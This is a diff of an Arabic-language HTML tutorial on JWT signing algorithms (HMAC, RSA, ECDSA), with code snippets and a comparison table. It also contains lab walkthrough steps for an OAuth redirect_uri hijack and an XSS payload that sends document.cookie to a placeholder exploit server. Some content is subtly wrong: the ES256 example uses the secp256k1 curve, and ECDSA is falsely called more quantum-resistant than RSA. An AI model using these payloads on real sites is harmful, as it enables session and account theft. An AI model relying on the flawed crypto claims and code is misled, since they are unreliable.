+1. خوارزمية SHA (مثل SHA-256)
+2. المفتاح السري (مثل "my-secret-key")
+3. البيانات (header.payload)
+
+# الحساب:
+HMAC-SHA256(data, secret) = SHA256((secret ⊕ opad) || SHA256((secret ⊕ ipad) || data))
+
+# بشكل مبسط:
+signature = HMAC-SHA256("eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ", "my-secret-key")
+
+# النتيجة:
+signature = "SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
+                </div>
+                
+                <div class="grid">
+                    <div class="card">
+                        <h4>HS256 (HMAC + SHA-256)</h4>
+                        <ul class="list">
+                            <li><strong>الطول:</strong> 256-bit signature</li>
+                            <li><strong>السرعة:</strong> سريع جداً</li>
+                            <li><strong>الأمان:</strong> قوي إذا كان المفتاح قوي</li>
+                            <li><strong>الاستخدام:</strong> التطبيقات البسيطة</li>
+                        </ul>
+                        <div class="code-block">
+// Node.js مثال
+const crypto = require('crypto');
+const secret = 'my-256-bit-secret';
+const data = 'header.payload';
+
+const signature = crypto
+  .createHmac('sha256', secret)
+  .update(data)
+  .digest('base64url');
+                        </div>
+                    </div>
+                    
+                    <div class="card">
+                        <h4>HS384 (HMAC + SHA-384)</h4>
+                        <ul class="list">
+                            <li><strong>الطول:</strong> 384-bit signature</li>
+                            <li><strong>السرعة:</strong> أبطأ قليلاً من HS256</li>
+                            <li><strong>الأمان:</strong> أقوى من HS256</li>
+                            <li><strong>الاستخدام:</strong> التطبيقات المتوسطة</li>
+                        </ul>
+                    </div>
+                    
+                    <div class="card">
+                        <h4>HS512 (HMAC + SHA-512)</h4>
+                        <ul class="list">
+                            <li><strong>الطول:</strong> 512-bit signature</li>
+                            <li><strong>السرعة:</strong> الأبطأ في عائلة HMAC</li>
+                            <li><strong>الأمان:</strong> الأقوى في عائلة HMAC</li>
+                            <li><strong>الاستخدام:</strong> التطبيقات عالية الأمان</li>
+                        </ul>
                     </div>
                 </div>
                 
-                <div class="card">
-                    <h4>RSA (RS256/384/512)</h4>
-                    <p><strong>النوع:</strong> مفتاح عام/خاص (Asymmetric)</p>
-                    <p><strong>الاستخدام:</strong> مفتاح خاص للتوقيع، عام للتحقق</p>
-                    <p><strong>الأمان:</strong> أكثر أماناً، لا يحتاج مشاركة المفتاح السري</p>
-                    
-                    <div class="code-block">
-// إنشاء RSA JWT
-const fs = require('fs');
-const privateKey = fs.readFileSync('private.pem');
+                <div class="danger">
+                    <h4>⚠️ نقاط ضعف HMAC</h4>
+                    <ul class="list">
+                        <li><strong>مشاركة المفتاح:</strong> يجب أن يعرف الجميع نفس المفتاح</li>
+                        <li><strong>إدارة المفاتيح:</strong> صعوبة تدوير المفاتيح</li>
+                        <li><strong>المفاتيح الضعيفة:</strong> إذا كان المفتاح ضعيف، يمكن كسره</li>
+                        <li><strong>تسريب المفتاح:</strong> إذا تسرب المفتاح، كل شيء مكشوف</li>
+                    </ul>
+                </div>
+            </div>
 
-const token = jwt.sign({
-  sub: '123',
-  name: 'Ahmed'
-}, privateKey, { 
+            <div class="attack-demo">
+                <h4>🔐 2. RSA (Rivest-Shamir-Adleman)</h4>
+                <p><strong>الفكرة:</strong> مفتاحان مختلفان - خاص للتوقيع، عام للتحقق</p>
+                
+                <div class="mermaid">
+graph TD
+    A[إنشاء زوج مفاتيح RSA] --> B[المفتاح الخاص<br/>Private Key]
+    A --> C[المفتاح العام<br/>Public Key]
+    
+    D[البيانات: header.payload] --> E[توقيع بالمفتاح الخاص]
+    B --> E
+    E --> F[التوقيع الرقمي]
+    
+    G[التحقق] --> H[فك التوقيع بالمفتاح العام]
+    C --> H
+    F --> H
+    D --> I[hash البيانات]
+    H --> J[hash من التوقيع]
+    I --> K{هل متطابقان؟}
+    J --> K
+    K -->|نعم| L[صحيح ✅]
+    K -->|لا| M[مزيف ❌]
+    
+    style B fill:#ff9800
+    style C fill:#81c784
+    style L fill:#e8f5e8
+    style M fill:#ffebee
+                </div>
+                
+                <div class="code-block">
+# كيف يعمل RSA:
+
+1. إنشاء المفاتيح:
+   - اختيار عددين أوليين كبيرين: p, q
+   - حساب n = p × q
+   - حساب φ(n) = (p-1)(q-1)
+   - اختيار e (عادة 65537)
+   - حساب d حيث e × d ≡ 1 (mod φ(n))
+   
+2. المفتاح العام: (n, e)
+3. المفتاح الخاص: (n, d)
+
+4. التوقيع:
+   signature = (hash(data))^d mod n
+
+5. التحقق:
+   hash_from_signature = signature^e mod n
+   if hash_from_signature == hash(data): valid
+                </div>
+                
+                <div class="grid">
+                    <div class="card">
+                        <h4>RS256 (RSA + SHA-256)</h4>
+                        <div class="code-block">
+// إنشاء مفاتيح RSA
+const crypto = require('crypto');
+const { publicKey, privateKey } = crypto.generateKeyPairSync('rsa', {
+  modulusLength: 2048,
+  publicKeyEncoding: { type: 'spki', format: 'pem' },
+  privateKeyEncoding: { type: 'pkcs8', format: 'pem' }
+});
+
+// التوقيع
+const jwt = require('jsonwebtoken');
+const token = jwt.sign({ sub: '123', name: 'Ahmed' }, privateKey, { 
   algorithm: 'RS256',
   keyid: 'key-1'
 });
+
+// التحقق
+const decoded = jwt.verify(token, publicKey, { algorithms: ['RS256'] });
+                        </div>
+                    </div>
+                    
+                    <div class="card">
+                        <h4>RS384 & RS512</h4>
+                        <ul class="list">
+                            <li><strong>RS384:</strong> RSA + SHA-384</li>
+                            <li><strong>RS512:</strong> RSA + SHA-512</li>
+                            <li><strong>الفرق:</strong> طول hash function</li>
+                            <li><strong>الأمان:</strong> RS512 > RS384 > RS256</li>
+                        </ul>
                     </div>
                 </div>
                 
-                <div class="card">
-                    <h4>ECDSA (ES256/384/512)</h4>
-                    <p><strong>النوع:</strong> منحني إهليلجي (Elliptic Curve)</p>
-                    <p><strong>الاستخدام:</strong> أسرع من RSA مع نفس مستوى الأمان</p>
-                    <p><strong>الأمان:</strong> مفاتيح أصغر، أداء أفضل</p>
+                <div class="tip">
+                    <h4>💡 مميزات RSA</h4>
+                    <ul class="list">
+                        <li><strong>لا حاجة لمشاركة أسرار:</strong> المفتاح العام يمكن نشره</li>
+                        <li><strong>إدارة مفاتيح أسهل:</strong> كل طرف له مفاتيحه الخاصة</li>
+                        <li><strong>أمان عالي:</strong> صعب كسر المفاتيح الطويلة</li>
+                        <li><strong>معيار صناعي:</strong> مستخدم في كل مكان</li>
+                    </ul>
+                </div>
+                
+                <div class="warn">
+                    <h4>⚠️ عيوب RSA</h4>
+                    <ul class="list">
+                        <li><strong>بطيء:</strong> أبطأ بكثير من HMAC</li>
+                        <li><strong>حجم كبير:</strong> التوقيعات والمفاتيح كبيرة</li>
+                        <li><strong>استهلاك طاقة:</strong> يحتاج معالجة أكثر</li>
+                        <li><strong>تعقيد التطبيق:</strong> أصعب في التنفيذ</li>
+                    </ul>
+                </div>
+            </div>
+
+            <div class="attack-demo">
+                <h4>📐 3. ECDSA (Elliptic Curve Digital Signature Algorithm)</h4>
+                <p><strong>الفكرة:</strong> نفس مبدأ RSA لكن باستخدام المنحنيات الإهليلجية</p>
+                
+                <div class="mermaid">
+graph TD
+    A[منحنى إهليلجي<br/>y² = x³ + ax + b] --> B[نقطة أساسية G]
+    C[مفتاح خاص: d<br/>عدد عشوائي] --> D[مفتاح عام: Q = d × G<br/>نقطة على المنحنى]
+    
+    E[البيانات] --> F[hash البيانات]
+    F --> G[إنشاء k عشوائي]
+    G --> H[حساب r = (k × G).x mod n]
+    C --> I[حساب s = k⁻¹(hash + r×d) mod n]
+    H --> J[التوقيع: (r, s)]
+    I --> J
+    
+    K[التحقق] --> L[حساب u1 = hash × s⁻¹ mod n]
+    K --> M[حساب u2 = r × s⁻¹ mod n]
+    L --> N[نقطة = u1×G + u2×Q]
+    M --> N
+    D --> N
+    N --> O{هل r == نقطة.x mod n؟}
+    O -->|نعم| P[صحيح ✅]
+    O -->|لا| Q[مزيف ❌]
+    
+    style C fill:#ff9800
+    style D fill:#81c784
+    style P fill:#e8f5e8
+    style Q fill:#ffebee
+                </div>
+                
+                <div class="code-block">
+# المنحنيات الشائعة:
+
+1. P-256 (secp256r1) - للـ ES256:
+   y² = x³ - 3x + b (mod p)
+   حيث p = 2²⁵⁶ - 2²²⁴ + 2¹⁹² + 2⁹⁶ - 1
+
+2. P-384 (secp384r1) - للـ ES384:
+   مشابه لكن بحجم 384-bit
+
+3. P-521 (secp521r1) - للـ ES512:
+   مشابه لكن بحجم 521-bit
+
+# مثال إنشاء مفاتيح ECDSA:
+const crypto = require('crypto');
+const { publicKey, privateKey } = crypto.generateKeyPairSync('ec', {
+  namedCurve: 'secp256k1',  // أو 'prime256v1' للـ P-256
+  publicKeyEncoding: { type: 'spki', format: 'pem' },
+  privateKeyEncoding: { type: 'pkcs8', format: 'pem' }
+});
+
+# التوقيع:
+const token = jwt.sign({ sub: '123' }, privateKey, { algorithm: 'ES256' });
+                </div>
+                
+                <div class="grid">
+                    <div class="card">
+                        <h4>ES256 (ECDSA + P-256 + SHA-256)</h4>
+                        <ul class="list">
+                            <li><strong>المنحنى:</strong> P-256 (prime256v1)</li>
+                            <li><strong>حجم المفتاح:</strong> 256-bit</li>
+                            <li><strong>قوة الأمان:</strong> مكافئة لـ RSA 3072-bit</li>
+                            <li><strong>السرعة:</strong> أسرع من RSA</li>
+                        </ul>
+                    </div>
+                    
+                    <div class="card">
+                        <h4>ES384 & ES512</h4>
+                        <ul class="list">
+                            <li><strong>ES384:</strong> P-384 + SHA-384</li>
+                            <li><strong>ES512:</strong> P-521 + SHA-512</li>
+                            <li><strong>ملاحظة:</strong> ES512 يستخدم P-521 وليس P-512</li>
+                            <li><strong>الأمان:</strong> أقوى تدريجياً</li>
+                        </ul>
+                    </div>
+                </div>
+                
+                <div class="tip">
+                    <h4>🚀 لماذا ECDSA أفضل؟</h4>
+                    <ul class="list">
+                        <li><strong>مفاتيح أصغر:</strong> 256-bit ECDSA = 3072-bit RSA</li>
+                        <li><strong>سرعة أعلى:</strong> توقيع وتحقق أسرع من RSA</li>
+                        <li><strong>استهلاك أقل:</strong> ذاكرة وطاقة أقل</li>
+                        <li><strong>مستقبلي:</strong> مقاوم للحاسوب الكمي أكثر من RSA</li>
+                    </ul>
+                </div>
+            </div>
+
+            <div class="attack-demo">
+                <h4>⚡ مقارنة سريعة بين الخوارزميات</h4>
+                
+                <div class="mermaid">
+graph TD
+    A[اختيار خوارزمية JWT] --> B{نوع التطبيق؟}
+    
+    B -->|تطبيق بسيط<br/>مفتاح واحد| C[HMAC]
+    B -->|تطبيق موزع<br/>عدة خدمات| D[RSA أو ECDSA]
+    B -->|أداء عالي<br/>موارد محدودة| E[ECDSA]
+    
+    C --> F[HS256: سريع وبسيط<br/>HS384/512: أمان أعلى]
+    D --> G[RSA: معيار قديم موثوق<br/>ECDSA: حديث وأسرع]
+    E --> H[ES256: الأكثر شيوعاً<br/>ES384/512: أمان فائق]
+    
+    style C fill:#81c784
+    style G fill:#42a5f5
+    style H fill:#ff9800
+                </div>
+                
+                <div class="code-block">
+# جدول مقارنة الأداء:
+
+خوارزمية    | حجم المفتاح | سرعة التوقيع | سرعة التحقق | حجم التوقيع | الأمان
+-----------|-------------|-------------|-------------|-------------|--------
+HS256      | 256-bit     | ⭐⭐⭐⭐⭐      | ⭐⭐⭐⭐⭐      | 256-bit     | ⭐⭐⭐
+HS384      | 384-bit     | ⭐⭐⭐⭐       | ⭐⭐⭐⭐       | 384-bit     | ⭐⭐⭐⭐
+HS512      | 512-bit     | ⭐⭐⭐⭐       | ⭐⭐⭐⭐       | 512-bit     | ⭐⭐⭐⭐⭐
+RS256      | 2048-bit    | ⭐⭐         | ⭐⭐⭐        | 2048-bit    | ⭐⭐⭐⭐
+RS384      | 2048-bit    | ⭐⭐         | ⭐⭐⭐        | 2048-bit    | ⭐⭐⭐⭐⭐
+RS512      | 2048-bit    | ⭐⭐         | ⭐⭐⭐        | 2048-bit    | ⭐⭐⭐⭐⭐
+ES256      | 256-bit     | ⭐⭐⭐⭐       | ⭐⭐⭐⭐       | 512-bit     | ⭐⭐⭐⭐
+ES384      | 384-bit     | ⭐⭐⭐        | ⭐⭐⭐        | 768-bit     | ⭐⭐⭐⭐⭐
+ES512      | 521-bit     | ⭐⭐⭐        | ⭐⭐⭐        | 1042-bit    | ⭐⭐⭐⭐⭐
+
+# التوصيات:
+✅ للتطبيقات البسيطة: HS256
+✅ للتطبيقات الموزعة: ES256
+✅ للأمان العالي: ES384 أو HS512
+✅ للتوافق القديم: RS256
                 </div>
             </div>
 
@@ -824,7 +1712,7 @@ print(f"Admin Token: {admin_token}")
                 <div class="code-block">
 # خطوات الحل:
 1. ابدأ OAuth flow وحلل redirect_uri
-2. غيّر redirect_uri إلى exploit server
+2. غيّر redirect_uri إلى https://YOUR-EXPLOIT-SERVER
 3. أرسل الرابط للضحية
 4. اعترض authorization code من exploit server logs
 5. استخدم code لتسجيل الدخول كالضحية
@@ -861,8 +1749,8 @@ print(f"Admin Token: {admin_token}")
 # خطوات الحل:
 1. اكتشف XSS في comment section
 2. أنشئ payload لسرقة cookie:
-   <script>document.location='//exploit-server/'+document.cookie</script>
-3. اعترض stay-logged-in cookie من exploit server
+   &lt;script&gt;document.location='https://YOUR-EXPLOIT-SERVER/'+document.cookie&lt;/script&gt;
+3. اعترض stay-logged-in cookie من exploit server logs
 4. فك تشفير وكسر MD5 hash
 5. سجل دخول بالبيانات المكسورة
                 </div>
@@ -921,12 +1809,36 @@ print(f"Admin Token: {admin_token}")
             startOnLoad: true,
             theme: 'dark',
             themeVariables: {
-                primaryColor: '#3b82f6',
-                primaryTextColor: '#ffffff',
-                primaryBorderColor: '#1e40af',
-                lineColor: '#64b5f6',
-                secondaryColor: '#1e293b',
-                tertiaryColor: '#0f172a'
+                primaryColor: '#42a5f5',
+                primaryTextColor: '#e8eaed',
+                primaryBorderColor: '#2d3748',
+                lineColor: '#81c784',
+                secondaryColor: '#1a2332',
+                tertiaryColor: '#0f1724',
+                background: '#1a2332',
+                mainBkg: '#1a2332',
+                secondBkg: '#0f1724',
+                tertiaryBkg: '#2d3748',
+                nodeBorder: '#2d3748',
+                clusterBkg: '#0f1724',
+                clusterBorder: '#2d3748',
+                defaultLinkColor: '#81c784',
+                titleColor: '#e8eaed',
+                edgeLabelBackground: '#1a2332',
+                nodeTextColor: '#e8eaed',
+                // إضافات لضمان الوضوح
+                textColor: '#e8eaed',
+                actorTextColor: '#e8eaed',
+                labelTextColor: '#e8eaed',
+                loopTextColor: '#e8eaed',
+                activationTextColor: '#e8eaed',
+                sectionBkgColor: '#1a2332',
+                altSectionBkgColor: '#0f1724',
+                gridColor: '#2d3748',
+                c0: '#42a5f5',  // Class diagram colors
+                c1: '#81c784',
+                c2: '#ff9800',
+                c3: '#e91e63'
             }
         });
     </script>
